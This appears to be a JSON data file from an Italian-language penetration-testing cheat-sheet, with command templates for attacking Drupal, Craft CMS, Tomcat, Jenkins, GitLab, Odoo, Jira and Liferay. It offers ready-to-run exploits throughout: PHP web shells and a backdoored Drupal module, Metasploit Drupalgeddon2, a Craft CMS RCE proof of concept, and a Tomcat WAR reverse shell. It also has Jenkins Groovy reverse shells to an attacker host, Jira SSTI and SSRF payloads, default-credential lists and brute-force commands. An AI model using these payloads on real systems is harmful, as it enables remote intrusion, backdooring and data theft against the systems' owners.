    "description": "Scanner per Drupal e Joomla: versione, plugin e tema. Identifica la versione per cercare l’exploit giusto (es. Drupalgeddon).",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "droopescan",
      "drupal",
      "joomla",
      "cms"
    ],
    "template": "droopescan scan drupal -u http://<ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Drupal",
        "template": "droopescan scan drupal -u http://<ip>",
        "description": "Scansione di un sito Drupal."
      },
      {
        "id": "joomla",
        "label": "Joomla",
        "template": "droopescan scan joomla -u http://<ip>",
        "description": "Scansione di un sito Joomla."
      }
    ]
  },
  {
    "id": "drupal-rce",
    "name": "Drupal — RCE (PHP filter / Drupalgeddon)",
    "category": "service-enum",
    "subcategory": "web-apps",
    "group": "CMS",
    "description": "Ottenere una shell su Drupal non è immediato come su altri CMS. Le tre vie principali:\n1. Drupalgeddon2 (CVE-2018-7600): sui core datati, una SQL injection pre-autenticazione dà esecuzione di comandi senza credenziali.\n2. PHP filter: con accesso amministrativo, il modulo permette di pubblicare una pagina che esegue codice PHP.\n3. Modulo con web shell: si carica un modulo legittimo modificato per includervi una web shell.\nIl codice gira come utente del web server, di norma www-data.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "drupal",
      "cms",
      "php-filter",
      "drupalgeddon",
      "rce"
    ],
    "template": "# Drupal <8: attivazione del modulo core \"PHP filter\"\n# Drupal >=8: installazione prima del modulo php-8.x-1.1.tar.gz da drupal.org\n# Content > Add content > Basic page, Text format \"PHP code\", corpo della pagina:\n<?php system($_GET['<hash>']); ?>\n# la pagina viene salvata su /node/<node>, esecuzione comandi:\ncurl -s \"http://<ip>/node/<node>?<hash>=id\"",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "drupal.inlanefreight.local"
      },
      {
        "key": "hash",
        "label": "Nome parametro",
        "placeholder": "dcfdd5e021a869fcc6dfaef8bf31377e",
        "ctx": "hash"
      },
      {
        "key": "node",
        "label": "Node ID",
        "placeholder": "3"
      },
      {
        "key": "lhost",
        "label": "LHOST",
        "placeholder": "10.10.14.3"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "PHP filter (web shell)",
        "template": "# Drupal <8: attivazione del modulo core \"PHP filter\"\n# Drupal >=8: installazione prima del modulo php-8.x-1.1.tar.gz da drupal.org\n# Content > Add content > Basic page, Text format \"PHP code\", corpo della pagina:\n<?php system($_GET['<hash>']); ?>\n# la pagina viene salvata su /node/<node>, esecuzione comandi:\ncurl -s \"http://<ip>/node/<node>?<hash>=id\"",
        "description": "Modulo PHP filter come vettore. Prima della 8 è nel core e basta abilitarlo, dalla 8 va installato a parte. Una Basic page con Text format `PHP code` esegue lo snippet, e il parametro GET rinominato con un hash evita una web shell dal nome ovvio. Modifica invasiva: richiede consenso e cleanup di modulo e pagina."
      },
      {
        "id": "backdoor",
        "label": "modulo backdoor",
        "template": "# scarica un modulo legittimo da drupal.org\nwget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz\n\n# lo scompatta\ntar xf captcha-8.x-1.2.tar.gz\n\n# aggiunge la webshell PHP dentro il modulo\nprintf '<?php system($_GET[\"<hash>\"]); ?>' > captcha/shell.php\n\n# aggiunge un .htaccess che sblocca l'accesso diretto a /modules\nprintf '<IfModule mod_rewrite.c>\\nRewriteEngine On\\nRewriteBase /\\n</IfModule>' > captcha/.htaccess\n\n# ricompatta il modulo, ora con la backdoor dentro\ntar czf captcha.tar.gz captcha/\n\n# dopo l'upload da Manage > Extend > Install new module, esegue i comandi\ncurl -s \"http://<ip>/modules/captcha/shell.php?<hash>=id\"",
        "description": "Modulo legittimo trasformato in backdoor. Nell'archivio del modulo Captcha vengono aggiunti una web shell PHP e un `.htaccess` che sblocca l'accesso diretto a `/modules`; dopo l'installazione dal pannello la shell risponde su `/modules/captcha/shell.php`. Anche qui servono consenso e rimozione degli artefatti."
      },
      {
        "id": "drupalgeddon2",
        "label": "Drupalgeddon2 (CVE-2018-7600)",
        "template": "msfconsole -q -x \"use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS <ip>; set LHOST <lhost>; run; exit\"",
        "description": "RCE pre-auth su Drupal < 7.58 e < 8.5.1, dovuta a sanitizzazione insufficiente in fase di registrazione utente. Nessuna credenziale richiesta: il modulo Metasploit consegna direttamente una sessione con i privilegi del web server."
      }
    ],
    "note": "# Cleanup obbligatorio\nPHP filter e modulo backdoor modificano l'istanza del cliente: vanno concordati e poi rimossi, con modulo disabilitato e pagine o file cancellati. Le installazioni recenti bloccano `CHANGELOG.txt` e `README.txt`, quindi per la versione conviene droopescan.\n# Credenziali di default\n`admin:admin` · `admin:password`. Con un admin valido, il modulo PHP filter o Drupalgeddon portano a RCE (vedi varianti).",
    "refs": [
      {
        "label": "Drupal — SA-CORE-2018-002",
        "url": "https://www.drupal.org/sa-core-2018-002"
      }
    ]
  },
  {
    "id": "craftcms-rce",
    "name": "Craft CMS — pre-auth RCE (CVE-2025-32432)",
    "category": "service-enum",
    "subcategory": "web-apps",
    "group": "CMS",
    "description": "L'endpoint `assets/generate-transform` risponde senza credenziali e deserializza parte del JSON che riceve, quindi è l'attaccante a scegliere quali classi istanziare. La catena `FieldLayoutBehavior, yii\\rbac\\PhpManager` fa puntare `itemFile` al file di sessione PHP, dove Craft scrive i dati di richiesta che non riconosce: si avvelena la sessione con codice PHP, il gadget la include e il codice gira come utente del web server, di norma www-data.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "craftcms",
      "cms",
      "cve-2025-32432",
      "deserialization",
      "yii",
      "rce"
    ],
    "template": "# scarica il PoC dal repo\ngit clone https://github.com/l0lsuit/CVE-2025-32432-craftcms-rce\n\n# entra nella directory appena creata\ncd CVE-2025-32432-craftcms-rce\n\n# esegue id sul target: sessione, token CSRF e asset ID li trova lo script\npython3 cve-2025-32432.py -u http://<ip> -c id",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "craft.inlanefreight.local"
      },
      {
        "key": "cmd",
        "label": "Comando",
        "placeholder": "cat /etc/passwd"
      },
      {
        "key": "asset",
        "label": "Asset ID",
        "placeholder": "1"
      },
      {
        "key": "lhost",
        "label": "LHOST",
        "placeholder": "10.10.14.3"
      },
      {
        "key": "lport",
        "label": "LPORT",
        "placeholder": "4444"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "comando singolo",
        "template": "# scarica il PoC dal repo\ngit clone https://github.com/l0lsuit/CVE-2025-32432-craftcms-rce\n\n# entra nella directory appena creata\ncd CVE-2025-32432-craftcms-rce\n\n# esegue id sul target: sessione, token CSRF e asset ID li trova lo script\npython3 cve-2025-32432.py -u http://<ip> -c id",
        "description": "Lo script ricava da sé cookie di sessione, token CSRF e un asset ID valido, poi esegue il comando e stampa l'output. Parti da `id`: dice con quali privilegi gira il web server."
      },
      {
        "id": "asset-noto",
        "label": "asset ID noto",
        "template": "python3 cve-2025-32432.py -u http://<ip> -c '<cmd>' -a <asset>",
        "description": "Con `-a` si salta il probing, che altrimenti prova gli asset ID fino a 100 (`--amax` cambia il limite) lasciando una scia di errori 500 nei log. L'ID si trova sfogliando il sito o da un primo run riuscito."
      },
      {
        "id": "shell",
        "label": "reverse shell",
        "template": "# listener in ascolto sulla macchina attaccante\nnc -lvnp <lport>\n\n# lancia l'exploit, che apre la shell verso il listener\npython3 cve-2025-32432.py -u http://<ip> --shell <lhost> <lport> -a <asset>",
        "description": "Listener prima, exploit dopo. Ottenuta la shell, il file `.env` nella root del progetto Craft contiene `CRAFT_SECURITY_KEY` e le credenziali del database, spesso riutilizzate altrove."
      },
      {
        "id": "debug",
        "label": "debug della catena",
        "template": "python3 cve-2025-32432.py -u http://<ip> -c '<cmd>' --debug",
        "description": "Stampa richieste e risposte di ogni fase. Serve quando l'exploit arriva in fondo senza eseguire nulla, per vedere dove si rompe la catena."
      }
    ],
    "note": "# Versioni vulnerabili\n- **Craft 3.x** · affette `3.0.0-RC1, 3.9.14` · corretta in `3.9.15`\n- **Craft 4.x** · affette `4.0.0-RC1, 4.14.14` · corretta in `4.14.15`\n- **Craft 5.x** · affette `5.0.0-RC1, 5.6.16` · corretta in `5.6.17`\n\nCraft non espone la versione in chiaro: la si deduce da `/admin`, dagli asset versionati e dagli header di risposta.\n# Perché i PoC pubblici non funzionano\n- **cookie**: Craft emette `CraftSessionId`, non `PHPSESSID`\n- **asset ID**: non esiste uno status code \"buono\". Un ID valido si riconosce perché la risposta diverge da quella di un ID inesistente\n- **token CSRF**: va preso da `index.php?p=actions/users/session-info` e abbinato alla sessione in corso, altrimenti il server risponde 400\n- **URL-encoding**: `requests` percent-encodifica la query string, così il payload arriva nel file di sessione come `%3C%3Fphp` e PHP non esegue nulla. Per questo la richiesta parte su socket raw\n# Prerequisiti e cleanup\nSul target serve `session.save_handler = files`: con le sessioni su Redis o database la catena non trova un file da includere. A fine test va rimosso il file di sessione avvelenato, che resta su disco con il payload PHP dentro.",
    "refs": [
      {
        "label": "PoC + writeup (l0lsuit)",
        "url": "https://github.com/l0lsuit/CVE-2025-32432-craftcms-rce"
      },
      {
        "label": "Craft CMS — GHSA-f3gw-9ww9-jmc3",
        "url": "https://github.com/craftcms/cms/security/advisories/GHSA-f3gw-9ww9-jmc3"
      },
      {
        "label": "SensePost — analisi della campagna in the wild",
        "url": "https://sensepost.com/blog/2025/investigating-an-in-the-wild-campaign-using-rce-in-craftcms/"
      }
    ]
  },
  {
    "id": "tomcat-manager",
    "name": "nmap — Tomcat Manager brute",
    "category": "service-enum",
    "subcategory": "web-apps",
    "group": "App Server",
    "description": "Bruteforce del Tomcat Manager (`/manager/html`). Credenziali deboli, deploy di un `.war` malevolo = RCE. Default comuni: `tomcat:tomcat`, `admin:admin`.",
    "note": "# Credenziali di default\n`tomcat:tomcat` · `admin:admin` · `tomcat:s3cret` · `admin:tomcat` · `role1:role1` · `manager:manager` · `tomcat:password` · `admin:` (vuota). Provale su `/manager/html` prima del brute vero e proprio.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "nmap",
      "tomcat",
      "brute"
    ],
    "template": "nmap -p<port> --script http-tomcat-manager-bruteforce <ip>",
    "variants": [
      {
        "id": "default",
        "label": "nmap brute",
        "template": "nmap -p<port> --script http-tomcat-manager-bruteforce <ip>",
        "description": "Bruteforce delle credenziali del Manager con lo script NSE, che prova la lista dei default noti come `tomcat:tomcat` e `admin:admin`."
      },
      {
        "id": "msf",
        "label": "metasploit",
        "template": "msfconsole -q -x \"use auxiliary/scanner/http/tomcat_mgr_login; set RHOSTS <ip>; set RPORT <port>; set STOP_ON_SUCCESS true; run; exit\"",
        "description": "Modulo Metasploit con la sua wordlist di default per il Manager. `STOP_ON_SUCCESS` interrompe al primo successo per non generare richieste inutili."
      },
      {
        "id": "deploy",
        "label": "deploy WAR (RCE)",
        "template": "# genera prima il WAR: msfvenom -p java/jsp_shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f war -o shell.war\ncurl -u <user>:<password> --upload-file shell.war \"http://<ip>:<port>/manager/text/deploy?path=/shell\"\n# poi triggera la shell: curl http://<ip>:<port>/shell/",
        "description": "Con credenziali valide, il deploy di un WAR contenente una JSP shell dà RCE. L'app deployata a `/shell` esegue il payload alla prima richiesta, restituendo la shell sul listener."
      }
    ],
    "params": [
      {
        "key": "port",
        "label": "Port",
        "placeholder": "8080"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "Utente Manager",
        "ctx": "user",
        "placeholder": "tomcat"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "admin"
      },
      {
        "key": "lhost",
        "label": "LHOST",
        "placeholder": "10.10.14.3"
      },
      {
        "key": "lport",
        "label": "LPORT",
        "placeholder": "443"
      }
    ],
    "refs": [
      {
        "label": "HackTricks — Tomcat",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/tomcat/index.html"
      }
    ]
  },
  {
    "id": "jenkins-script",
    "name": "Jenkins Script Console — Groovy RCE",
    "category": "service-enum",
    "subcategory": "web-apps",
    "group": "App Server",
    "description": "La Script Console di Jenkins, raggiungibile su `/script`, esegue codice Groovy arbitrario con i privilegi del processo, spesso SYSTEM su Windows o l'utente jenkins/root su Linux. L'accesso arriva da credenziali di default `admin:admin`, da un'istanza senza autenticazione o da un account amministrativo. Da Groovy si invocano comandi di sistema con `.execute()` oppure si apre direttamente una reverse shell.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "jenkins",
      "groovy",
      "rce",
      "script-console"
    ],
    "template": "def proc = \"<command>\".execute()\nproc.waitFor()\nprintln proc.text",
    "params": [
      {
        "key": "command",
        "label": "Comando",
        "placeholder": "id"
      },
      {
        "key": "lhost",
        "label": "LHOST",
        "placeholder": "10.10.14.3"
      },
      {
        "key": "lport",
        "label": "LPORT",
        "placeholder": "443"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "exec comando",
        "template": "def proc = \"<command>\".execute()\nproc.waitFor()\nprintln proc.text",
        "description": "Esecuzione di un singolo comando: `.execute()` avvia il processo e `proc.text` ne restituisce l'output nella console. È la prova diretta della RCE, di norma con `id` o `whoami`."
      },
      {
        "id": "linux",
        "label": "reverse shell Linux",
        "template": "String[] cmd = [\"/bin/bash\", \"-c\", \"exec 5<>/dev/tcp/<lhost>/<lport>;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]\nRuntime.getRuntime().exec(cmd)",
        "description": "Reverse shell su host Linux. Groovy apre un socket `/dev/tcp` verso l'attaccante e vi collega una shell bash. Serve un listener già in ascolto sulla porta scelta come LPORT."
      },
      {
        "id": "windows",
        "label": "reverse shell Windows",
        "template": "String host=\"<lhost>\";int port=<lport>;String cmd=\"cmd.exe\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();",
        "description": "Reverse shell su host Windows. `ProcessBuilder` avvia `cmd.exe` e ne collega input e output al socket verso l'attaccante. Su Windows Jenkins gira spesso come SYSTEM, quindi la shell arriva già privilegiata."
      }
    ],
    "note": "# Nodi e accesso anonimo\nSu alcune configurazioni la console risponde anche da `/computer/(master)/script`. Dalla 2.x con setup wizard l'accesso anonimo è disabilitato di default, quindi conta l'esito del login prima di puntare alla console.\n# Credenziali di default\n`admin:admin` · `admin:password` · `jenkins:jenkins` · `admin:` (vuota). Con un login valido, `/script` dà la Groovy console e quindi RCE.",
    "refs": [
      {
        "label": "HackTricks — Jenkins",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/jenkins.html"
      }
    ]
  },
  {
    "id": "gitlab-userenum",
    "name": "GitLab — user enumeration",
    "category": "service-enum",
    "subcategory": "web-apps",
    "group": "App Server",
    "description": "L'API pubblica di GitLab elenca gli utenti senza autenticazione, il che permette di costruire una lista per il password spray. Va controllata anche la versione, per cercare CVE note.",
    "note": "# Credenziali di default\n`root:5iveL!fe` (vecchio default pre-8.7) · `root:password` · `admin@example.com:5iveL!fe`. Dalle versioni recenti la password root va impostata al primo avvio, ma i lab restano indietro.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "gitlab",
      "user-enum",
      "api"
    ],
    "template": "curl -s \"http://<ip>/api/v4/users?per_page=100\" | jq -r \".[].username\"",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "web-default-creds",
    "name": "Default creds — app comuni",
    "category": "service-enum",
    "subcategory": "web-apps",
    "group": "Default Creds",
    "description": "Prima del brute force o di un exploit conviene provare le credenziali di default delle applicazioni più comuni: restano attive sorprendentemente spesso.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "default-creds",
      "jenkins",
      "splunk",
      "prtg",
      "tomcat"
    ],
    "template": "curl -s -u <user>:<password> http://<ip>:<port>/",
    "params": [
      {
        "key": "user",
        "label": "User",
        "placeholder": "admin",
        "ctx": "user"
      },
      {
        "key": "password",
        "label": "Password",
        "placeholder": "admin",
        "ctx": "password"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "port",
        "label": "Port",
        "placeholder": "8080"
      }
    ],
    "refs": [
      {
        "label": "HackTricks — Pentesting Web",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/index.html"
      }
    ],
    "note": "# Credenziali di default\n- Tomcat: `tomcat:tomcat`, `admin:admin`\n- Jenkins: `admin:admin` (console Script su /script, esecuzione Groovy)\n- Splunk: `admin:changeme`\n- PRTG: `prtgadmin:prtgadmin` (CVE-2018-9276, command injection)"
  },
  {
    "id": "odoo-enum",
    "name": "Odoo — fingerprint & database",
    "category": "service-enum",
    "subcategory": "web-apps",
    "group": "Odoo (ERP)",
    "description": "Odoo è un ERP web modulare, esposto su `/web`. OdooMap lo riconosce e ne rivela versione, database esposti, stato della registrazione al portale ed endpoint accessibili. I nomi dei database sono case-sensitive ma spesso in minuscolo (nome azienda, `odoo`, `prod`, `test`): scoprire un database valido è il prerequisito per ogni attacco successivo, perché gli account sono legati al singolo database.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "odoo",
      "odoomap",
      "erp"
    ],
    "template": "odoomap -u https://<ip>",
    "params": [
      {
        "key": "ip",
        "label": "Host",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "detect",
        "label": "Fingerprint",
        "template": "odoomap -u https://<ip>",
        "description": "Identifica Odoo e ne stampa versione, database esposti ed endpoint (`/web`, `/shop`, `/forum`). La versione serve al CVE scanner."
      },
      {
        "id": "dbnames",
        "label": "Enum database",
        "template": "odoomap -u https://<ip> -n -N db-names.txt",
        "description": "Brute dei nomi database da wordlist. Punta su nomi aziendali e termini generici (`odoo`, `prod`, `test`), tutti in minuscolo."
      },
      {
        "id": "cve",
        "label": "CVE scanner",
        "template": "odoomap -u https://<ip> --plugin cve-scanner",
        "description": "Confronta la versione rilevata con l'NVD. `odoomap --list-plugins` elenca gli altri plugin disponibili."
      }
    ],
    "refs": [
      {
        "label": "karrab7 — Pentesting Odoo with OdooMap",
        "url": "https://karrab7.com/articles/Pentesting-Odoo-Applications-with-OdooMap"
      }
    ]
  },
  {
    "id": "odoo-exploit",
    "name": "Odoo — auth, master pw & dump",
    "category": "service-enum",
    "subcategory": "web-apps",
    "group": "Odoo (ERP)",
    "description": "Con un database noto si attaccano le credenziali, il master password e i dati. Il brute force prova utente/password sul database (gli account sono per-database). Il master password controlla la gestione dei database (creazione, backup, duplicazione, cancellazione): comprometterlo permette backup/restore arbitrari fino alla RCE. Post-auth si estraggono i modelli via XML-RPC/JSON-RPC dove i permessi sono mal configurati.",
    "note": "# Credenziali di default\n`admin:admin` è il default di installazione (utente e spesso master password). Provalo prima del brute.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "odoo",
      "odoomap",
      "brute",
      "rce"
    ],
    "template": "odoomap -u https://<ip> -D <db> -b --usernames users.txt --passwords passwords.txt",
    "params": [
      {
        "key": "ip",
        "label": "Host",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "db",
        "label": "Database",
        "placeholder": "prod"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "admin"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ],
    "variants": [
      {
        "id": "brute",
        "label": "Brute credenziali",
        "template": "odoomap -u https://<ip> -D <db> -b --usernames users.txt --passwords passwords.txt",
        "description": "Prova le combinazioni contro un database specifico (`-D`). Senza wordlist tenta le credenziali di default come `admin:admin`."
      },
      {
        "id": "master",
        "label": "Master password",
        "template": "odoomap -u https://<ip> -M -p pass-list.txt",
        "description": "Cracka il master password che governa la gestione dei database. Ottenuto, i backup/restore diventano una via alla RCE sul server."
      },
      {
        "id": "extract",
        "label": "Dump modelli",
        "template": "odoomap -u https://<ip> -D <db> -U <user> -P <password> -d res.users,res.partner",
        "description": "Esporta in JSON i modelli indicati (qui utenti e contatti). `-e` elenca i modelli accessibili, `-pe` mostra i permessi read/write/create/delete."
      },
      {
        "id": "privesc",
        "label": "Privesc (Odoo < 15)",
        "template": "odoomap -u https://<ip> -D <db> -U <user> -P <password> --plugin old-odoo-privesc",
        "description": "Sulle versioni precedenti alla 15.0 sfrutta una privilege escalation nota via ORM per passare ad amministratore dell'istanza."
      }
    ],
    "refs": [
      {
        "label": "karrab7 — Pentesting Odoo with OdooMap",
        "url": "https://karrab7.com/articles/Pentesting-Odoo-Applications-with-OdooMap"
      }
    ]
  },
  {
    "id": "jira-enum",
    "name": "Jira — versione, utenti & info leak",
    "category": "service-enum",
    "subcategory": "web-apps",
    "group": "Jira (Atlassian)",
    "description": "Jira espone diversi endpoint che, su versioni non aggiornate, perdono informazioni senza autenticazione. Il file `pom.xml` rivela la versione esatta (da cui i CVE applicabili), il group/user picker enumera tutti gli utenti, e i filtri/dashboard pubblici mostrano progetti e nomi interni. La versione ricavata qui guida la scelta dell'exploit.",
    "note": "# Credenziali di default\n`admin:admin` è il default di molte installazioni Jira/Service Desk. Prova anche `admin:password` sulla pagina di login prima del brute.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "jira",
      "atlassian",
      "user-enum"
    ],
    "template": "curl -sk 'http://<ip>/s/x/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml' | grep -i version",
    "params": [
      {
        "key": "ip",
        "label": "Host",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "version",
        "label": "Versione (CVE-2019-8442)",
        "template": "# versione dal pom.xml via path traversal pre-auth\ncurl -sk 'http://<ip>/s/x/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml' | grep -i version\n\n# versione e build dall'endpoint serverInfo\ncurl -sk 'http://<ip>/rest/api/2/serverInfo'",
        "description": "Legge la versione dal pom.xml (path traversal pre-auth CVE-2019-8442) o da `serverInfo`. Da qui si scelgono i CVE applicabili."
      },
      {
        "id": "userenum",
        "label": "Enum utenti",
        "template": "# elenca tutti gli utenti via groupuserpicker\ncurl -sk 'http://<ip>/rest/api/latest/groupuserpicker?query=%25&maxResults=50000&showAvatar=true'\n\n# conferma un utente via ViewUserHover\ncurl -sk 'http://<ip>/secure/ViewUserHover.jspa?username=admin'\n\n# enumera utenti senza login via QueryComponentRendererValue\ncurl -sk 'http://<ip>/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin'",
        "description": "Enumera tutti gli utenti tramite groupuserpicker (CVE-2019-8449), ViewUserHover (CVE-2020-14181) o QueryComponentRendererValue (CVE-2020-36289, unauth)."
      },
      {
        "id": "infoleak",
        "label": "Filtri, dashboard, progetti",
        "template": "# filtri condivisi pubblicamente\ncurl -sk 'http://<ip>/secure/ManageFilters.jspa?filterView=popular'\n\n# dashboard esposte via API\ncurl -sk 'http://<ip>/rest/api/2/dashboard?maxResults=100'\n\n# campi custom e chiavi progetto\ncurl -sk 'http://<ip>/secure/QueryComponent!Default.jspa'",
        "description": "Filtri e dashboard popolari, campi custom (CVE-2020-14179) e chiavi progetto (`/browse.<KEY>`, CVE-2020-14178) esposti senza login."
      }
    ],
    "refs": [
      {
        "label": "pentest-book — Jira",
        "url": "https://www.pentest-book.com/enumeration/webservices/jira"
      },
      {
        "label": "Atlassian-Jira-pentesting (CVE list)",
        "url": "https://github.com/UGF0aWVudF9aZXJv/Atlassian-Jira-pentesting"
      }
    ]
  },
  {
    "id": "jira-exploit",
    "name": "Jira — SSRF, RCE & path traversal",
    "category": "service-enum",
    "subcategory": "web-apps",
    "group": "Jira (Atlassian)",
    "description": "I CVE ad alto impatto di Jira: due SSRF (uno con bypass della validazione appendendo `@host`), una template injection che porta a RCE non autenticata, una path traversal che legge file arbitrari e una XSS nel Wallboard. Vanno provati in base alla versione ricavata in enumerazione, partendo da SSRF e RCE.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "jira",
      "ssrf",
      "rce",
      "ssti"
    ],
    "template": "curl -sk 'http://<ip>/plugins/servlet/gadgets/makeRequest?url=https://<ip>:1337@<lhost>'",
    "params": [
      {
        "key": "ip",
        "label": "Host",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "lhost",
        "label": "LHOST",
        "placeholder": "10.10.14.5"
      },
      {
        "key": "cmd",
        "label": "Comando",
        "placeholder": "id"
      },
      {
        "key": "target",
        "label": "Target SSRF",
        "placeholder": "169.254.169.254"
      }
    ],
    "variants": [
      {
        "id": "ssrf-gadgets",
        "label": "SSRF makeRequest (CVE-2019-8451)",
        "template": "curl -sk 'http://<ip>/plugins/servlet/gadgets/makeRequest?url=https://<ip>:1337@<target>'",
        "description": "SSRF con bypass della validazione: `@<target>` fa fetchare Jira verso l'host interno indicato. Utile per la metadata cloud (`169.254.169.254`) o servizi interni."
      },
      {
        "id": "ssrf-oauth",
        "label": "SSRF oauth (CVE-2017-9506)",
        "template": "curl -sk 'http://<ip>/plugins/servlet/oauth/users/icon-uri?consumerUri=http://<target>'",
        "description": "SSRF via l'endpoint OAuth icon-uri: l'istanza carica l'URL indicato. Serve a raggiungere risorse interne o la metadata AWS."
      },
      {
        "id": "rce-ssti",
        "label": "RCE SSTI (CVE-2019-11581)",
        "template": "# POST a /secure/ContactAdministrators!default.jspa, payload nei campi subject/details:\n$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('<cmd>').waitFor()",
        "description": "Template injection non autenticata (se il contact form è abilitato e l'SMTP configurato) che esegue comandi come l'utente del servizio Jira. Verifica con un callback: `exec('curl http://<lhost>/x')`."
      },
      {
        "id": "lfi",
        "label": "Path traversal (CVE-2019-3396)",
        "template": "curl -sk -X POST 'http://<ip>/rest/tinymce/1/macro/preview' -H 'Content-Type: application/json' -d '{\"contentId\":\"1\",\"macro\":{\"name\":\"widget\",\"params\":{\"_template\":\"file:///etc/passwd\"},\"body\":\"\"}}'",
        "description": "La preview macro di Confluence/Jira Service Desk carica un `_template` arbitrario: `file:///` legge file locali, un URL remoto può portare a RCE via Velocity."
      },
      {
        "id": "xss-wallboard",
        "label": "XSS Wallboard (CVE-2018-20824)",
        "template": "http://<ip>/plugins/servlet/Wallboard/?dashboardId=10000&cyclePeriod=alert(document.domain)",
        "description": "XSS nel WallboardServlet: il parametro `cyclePeriod` non è sanitizzato ed esegue JavaScript nel contesto della vittima, per rubarne la sessione."
      }
    ],
    "refs": [
      {
        "label": "thehackerish — Jira vulnerabilities",
        "url": "https://thehackerish.com/jira-vulnerabilities-and-how-they-are-exploited-in-the-wild/"
      },
      {
        "label": "Atlassian-Jira-pentesting (CVE-2018-20824)",
        "url": "https://github.com/UGF0aWVudF9aZXJv/Atlassian-Jira-pentesting#cve-2018-20824-xss-in-wallboardservlet"
      }
    ]
  },
  {
    "id": "liferay-enum",
    "name": "Liferay — fingerprint & endpoint",
    "category": "service-enum",
    "subcategory": "web-apps",
    "group": "Liferay (Portal)",
    "description": "Liferay è un portale enterprise Java. Si riconosce dal login portlet (`p_p_id=58`), dall'API JSON Web Services su `/api/jsonws`, dal GraphQL su `/o/graphql` e dall'endpoint di licenza. I portlet si enumerano per ID numerico o per nome completo, e il Control Panel è spesso raggiungibile per rotte alternative anche quando il frontend lo nasconde. `/api/jsonws` è insieme superficie di enum e vettore RCE (CVE-2020-7961).",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "liferay",
      "portal",
      "jsonws"
    ],
    "template": "# versione e stato della licenza\ncurl -sk 'http://<ip>/c/portal/license'\n\n# elenco dei servizi JSONWS esposti\ncurl -sk 'http://<ip>/api/jsonws' | head",
    "params": [
      {
        "key": "ip",
        "label": "Host",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "admin"
      }
    ],
    "variants": [
      {
        "id": "detect",
        "label": "Fingerprint",
        "template": "# versione e stato della licenza\ncurl -sk 'http://<ip>/c/portal/license'\n\n# verifica il portlet di login: conferma che è Liferay\ncurl -sk -o /dev/null -w '%{http_code}\\n' 'http://<ip>/?p_p_id=com_liferay_login_web_portlet_LoginPortlet'\n\n# verifica se l'endpoint GraphQL risponde\ncurl -sk 'http://<ip>/o/graphql' -H 'Content-Type: application/json' -d '{\"query\":\"{__typename}\"}'",
